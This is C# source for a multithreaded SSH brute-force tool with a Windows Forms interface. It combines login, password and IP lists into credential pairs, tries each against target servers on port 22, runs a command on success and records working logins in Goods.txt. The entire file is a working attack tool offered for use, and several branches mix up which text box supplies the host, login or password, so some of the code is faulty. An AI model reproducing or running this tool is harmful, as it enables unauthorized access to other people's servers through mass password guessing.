using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using Renci.SshNet;

namespace ssh_brute
{
    public partial class Form1 : Form
    {
        public static string _logins;
        public static string _passwords;
        public static string _ips;
        public static string _combos;
        public static bool just_login = false;
        public static bool just_password = false;
        public static bool just_ips = false;
        public static string login;
        public static string password;
        public static string ips;
        public static List<string> threads = new List<string>();
        public static Thread thread0_start;
        public static Thread thread1_start;
        public static Thread thread2_start;
        public static int error_string = 0;
        public static int error_connection = 0;
        public static int goods = 0;
        public static int bads = 0;

        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "Logins load";
                openFileDialog.Filter = "TextFile(*.txt)|*.txt";
                openFileDialog.ShowDialog();
                textBox1.Text = openFileDialog.FileName;
                _logins = openFileDialog.FileName;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "Passwords load";
                openFileDialog.Filter = "TextFile(*.txt)|*.txt";
                openFileDialog.ShowDialog();
                textBox2.Text = openFileDialog.FileName;
                _passwords = openFileDialog.FileName;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "IPS load";
                openFileDialog.Filter = "TextFile(*.txt)|*.txt";
                openFileDialog.ShowDialog();
                textBox3.Text = openFileDialog.FileName;
                _ips = openFileDialog.FileName;
            }
        }

        public void combos_make()
        {
            just_login = false;
            just_password = false;
            just_ips = false;
            listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add("Working")));
            int counter = 0;
            string[] logins_lines = { "" };
            string[] passwds_lines = { "" };
            string[] ips_lines = { "" };
            if (textBox1.Text.Contains('\\')) { logins_lines = File.ReadAllLines(_logins); }
            else { login = textBox1.Text; just_login = true; }

            if (textBox2.Text.Contains('\\')) { passwds_lines = File.ReadAllLines(_passwords); }
            else { password = textBox2.Text; just_password = true; }

            if (textBox3.Text.Contains('\\')) { ips_lines = File.ReadAllLines(_ips); }
            else { ips = textBox3.Text; just_ips = true; }

            if (just_login == true & just_password == true & just_ips == true)
            {
                string thread_name = "Auth000";
                string combo = "";
                if (ips.Contains(':'))
                {
                    combo = $"{ips}|{login}:{password}";
                }
                else
                {
                    combo = $"{ips}:22|{login}:{password}";
                }
                threads.Add(thread_name);
                MessageBox.Show(combo);
                thread1_start = new Thread(() => authorize(combo, thread_name));
                thread1_start.Start();
                Thread.CurrentThread.Abort();
            }

            if (just_login == false & just_password == false & just_ips == false)
            {
                for (int i = 0; i < ips_lines.Length; i++)
                {
                    for (int j = 0; j < logins_lines.Length; j++)
                    {
                        for (int k = 0; k < passwds_lines.Length; k++)
                        {
                            if (ips_lines[i].Contains(':'))
                            {
                                string combo = ips_lines[i] + "|" + logins_lines[j] + ":" + passwds_lines[k];
                                using (StreamWriter sw = File.AppendText("out.txt"))
                                {
                                    sw.WriteLine(combo);
                                    counter++;
                                    if (counter % 10000 == 0)
                                    {
                                        listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
                                    }
                                }
                            }
                            else
                            {
                                string combo = ips_lines[i] + ":22|" + logins_lines[j] + ":" + passwds_lines[k];
                                using (StreamWriter sw = File.AppendText("out.txt"))
                                {
                                    sw.WriteLine(combo);
                                    counter++;
                                    if (counter % 10000 == 0)
                                    {
                                        listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
                                    }
                                }
                            }
                        }
                    }
                }
                MessageBox.Show($"Ready -> {counter}");
            }

            if (just_login == true & just_password == true & just_ips == false)
            {
                for (int j = 0; j < logins_lines.Length; j++)
                {
                    for (int k = 0; k < passwds_lines.Length; k++)
                    {
                        if (textBox2.Text.Contains(':'))
                        {
                            string combo = textBox2.Text + "|" + logins_lines[j] + ":" + textBox1.Text;
                            using (StreamWriter sw = File.AppendText("out.txt"))
                            {
                                sw.WriteLine(combo);
                                counter++;
                                if (counter % 10000 == 0)
                                {
                                    listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
                                }
                            }
                        }
                        else
                        {
                            string combo = textBox2.Text + ":22|" + logins_lines[j] + ":" + passwds_lines[k];
                            using (StreamWriter sw = File.AppendText("out.txt"))
                            {
                                sw.WriteLine(combo);
                                counter++;
                                if (counter % 10000 == 0)
                                {
                                    listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
                                }
                            }
                        }
                    }
                }
            }

            if (just_login == true & just_password == false & just_ips == true)
            {
                for (int k = 0; k < passwds_lines.Length; k++)
                {
                    if (textBox2.Text.Contains(':'))
                    {
                        string combo = textBox2.Text + "|" + textBox1.Text + ":" + passwds_lines[k];
                        using (StreamWriter sw = File.AppendText("out.txt"))
                        {
                            sw.WriteLine(combo);
                            counter++;
                            if (counter % 10000 == 0)
                            {
                                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
                            }
                        }
                    }
                    else
                    {
                        string combo = textBox2.Text + ":22|" + textBox1.Text + ":" + passwds_lines[k];
                        using (StreamWriter sw = File.AppendText("out.txt"))
                        {
                            sw.WriteLine(combo);
                            counter++;
                            if (counter % 10000 == 0)
                            {
                                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
                            }
                        }
                    }
                }
            }

            if (just_login == true & just_password == false & just_ips == false)
            {
                for (int i = 0; i < ips_lines.Length; i++)
                {
                    for (int k = 0; k < passwds_lines.Length; k++)
                    {
                        if (ips_lines[i].Contains(':'))
                        {
                            string combo = ips_lines[i] + "|" + textBox1.Text + ":" + passwds_lines[k];
                            using (StreamWriter sw = File.AppendText("out.txt"))
                            {
                                sw.WriteLine(combo);
                                counter++;
                                if (counter % 10000 == 0)
                                {
                                    listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
                                }
                            }
                        }
                        else
                        {
                            string combo = ips_lines[i] + ":22|" + textBox1.Text + ":" + passwds_lines[k];
                            using (StreamWriter sw = File.AppendText("out.txt"))
                            {
                                sw.WriteLine(combo);
                                counter++;
                                if (counter % 10000 == 0)
                                {
                                    listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
                                }
                            }
                        }
                    }
                }
            }

            if (just_login == false & just_password == true & just_ips == true)
            {
                for (int j = 0; j < logins_lines.Length; j++)
                {
                    if (textBox2.Text.Contains(':'))
                    {
                        string combo = textBox2.Text + "|" + logins_lines[j] + ":" + textBox1.Text;
                        using (StreamWriter sw = File.AppendText("out.txt"))
                        {
                            sw.WriteLine(combo);
                            counter++;
                            if (counter % 10000 == 0)
                            {
                                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
                            }
                        }
                    }
                    else
                    {
                        string combo = textBox2.Text + ":22|" + logins_lines[j] + ":" + textBox1.Text;
                        using (StreamWriter sw = File.AppendText("out.txt"))
                        {
                            sw.WriteLine(combo);
                            counter++;
                            if (counter % 10000 == 0)
                            {
                                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
                            }
                        }
                    }
                }
            }

            if (just_login == false & just_password == false & just_ips == true)
            {
                for (int j = 0; j < logins_lines.Length; j++)
                {
                    for (int k = 0; k < passwds_lines.Length; k++)
                    {
                        if (textBox2.Text.Contains(':'))
                        {
                            string combo = textBox2.Text + "|" + logins_lines[j] + ":" + passwds_lines[k];
                            using (StreamWriter sw = File.AppendText("out.txt"))
                            {
                                sw.WriteLine(combo);
                                counter++;
                                if (counter % 10000 == 0)
                                {
                                    listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
                                }
                            }
                        }
                        else
                        {
                            string combo = textBox2.Text + ":22|" + logins_lines[j] + ":" + passwds_lines[k];
                            using (StreamWriter sw = File.AppendText("out.txt"))
                            {
                                sw.WriteLine(combo);
                                counter++;
                                if (counter % 10000 == 0)
                                {
                                    listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
                                }
                            }
                        }
                    }
                }
            }

            if (just_login == true & just_password == true & just_ips == false)
            {
                for (int i = 0; i < ips_lines.Length; i++)
                {
                    if (ips_lines[i].Contains(':'))
                    {
                        string combo = ips_lines[i] + "|" + textBox1.Text + ":" + textBox1.Text;
                        using (StreamWriter sw = File.AppendText("out.txt"))
                        {
                            sw.WriteLine(combo);
                            counter++;
                            if (counter % 10000 == 0)
                            {
                                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
                            }
                        }
                    }
                    else
                    {
                        string combo = ips_lines[i] + ":22|" + textBox1.Text + ":" + textBox1.Text;
                        using (StreamWriter sw = File.AppendText("out.txt"))
                        {
                            sw.WriteLine(combo);
                            counter++;
                            if (counter % 10000 == 0)
                            {
                                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
                            }
                        }
                    }
                }
            }

            if (just_login == false & just_password == true & just_ips == false)
            {
                for (int i = 0; i < ips_lines.Length; i++)
                {
                    for (int j = 0; j < logins_lines.Length; j++)
                    {
                        if (ips_lines[i].Contains(':'))
                        {
                            string combo = ips_lines[i] + "|" + logins_lines[j] + ":" + textBox1.Text;
                            using (StreamWriter sw = File.AppendText("out.txt"))
                            {
                                sw.WriteLine(combo);
                                counter++;
                                if (counter % 10000 == 0)
                                {
                                    listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
                                }
                            }
                        }
                        else
                        {
                            string combo = ips_lines[i] + ":22|" + logins_lines[j] + ":" + textBox1.Text;
                            using (StreamWriter sw = File.AppendText("out.txt"))
                            {
                                sw.WriteLine(combo);
                                counter++;
                                if (counter % 10000 == 0)
                                {
                                    listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Combos -> {counter}")));
                                }
                            }
                        }
                    }
                }
            }

            MessageBox.Show($"Ready - {counter}");
        }

        private void button4_Click(object sender, EventArgs e)
        {
            just_login = false;
            just_password = false;
            just_ips = false; 
            thread0_start = new Thread(combos_make);
            thread0_start.Start();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "Combos load";
                openFileDialog.Filter = "TextFile(*.txt)|*.txt";
                openFileDialog.ShowDialog();
                listBox1.Items.Clear();
                _combos = openFileDialog.FileName;
                listBox1.Items.Add($"Combos path ->{openFileDialog.FileName}");
            }
        }

        public void authorize(string combos_line, string thread_name)
        {
            string ip = "";
            int port = 0;
            string username = "";
            string password = "";
            try
            {
                ip = combos_line.Split('|')[0].Split(':')[0];
                port = int.Parse(combos_line.Split('|')[0].Split(':')[1]);
                username = combos_line.Split('|')[1].Split(':')[0];
                password = combos_line.Split('|')[1].Split(':')[1];
            }
            catch { error_string++; label7.Invoke((MethodInvoker)(() => label7.Text = $"String Error: {error_string}")); }
            try
            {
                if (ip == String.Empty && port == 0 && username == "" && password == "") { }
                else
                {
                    PasswordConnectionInfo connectionInfo = new PasswordConnectionInfo(ip, port, username, password);
                    listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Trying -> {ip} | {port} | {username} | {password}")));
                    connectionInfo.Timeout = TimeSpan.FromSeconds(30);
                    using (var client = new SshClient(connectionInfo))
                    {
                        try
                        {
                            client.Connect();
                            if (client.IsConnected)
                            {
                                client.RunCommand("ls");
                                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Good one -> {combos_line}")));
                                goods++;
                                label4.Invoke((MethodInvoker)(() => label4.Text = $"Goods: {goods}"));
                                using (StreamWriter sw = new StreamWriter("Goods.txt"))
                                {
                                    sw.WriteLine(combos_line);
                                }
                            }
                            else
                            {
                                bads++;
                                label5.Invoke((MethodInvoker)(() => label5.Text = $"Bads: {bads}"));
                            }
                        }
                        catch 
                        {
                            bads++;
                            label5.Invoke((MethodInvoker)(() => label5.Text = $"Bads: {bads}"));
                        }
                    }
                }
            } catch { error_connection++; label8.Invoke((MethodInvoker)(() => label8.Text = $"Connection Error: {error_connection}")); }
            
            threads.Remove(thread_name);
        }


        public void bruteforcing()
        {
            try
            {
                var combos_lines = File.ReadAllLines(_combos);
                for (int i = 0; i < File.ReadAllLines(_combos).Length; i++)
                {
                    try
                    {
                        while (true)
                        {
                            label6.Invoke((MethodInvoker)(() => label6.Text = $"Active threads: {threads.Count}"));
                            if (threads.Count >= int.Parse(textBox11.Text)) { Thread.Sleep(10); }
                            else
                            {
                                string thread_name = $"Thread-{i}";
                                threads.Add(thread_name);
                                thread2_start = new Thread(() => authorize(File.ReadAllLines(_combos)[i], thread_name));
                                thread2_start.Start();
                                Thread.Sleep(50);
                                break;
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            goods = 0;
            bads = 0;
            error_string = 0;
            error_connection = 0;
            thread1_start = new Thread(bruteforcing);
            thread1_start.Start();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            
            try { Thread.CurrentThread.Abort(); } catch { Application.Exit(); }
            try { threads.Clear(); } catch { }
            try { thread0_start.Abort(); } catch { }
            try { thread1_start.Abort(); } catch { }
            try { thread2_start.Abort(); } catch { }
        }
    }
}
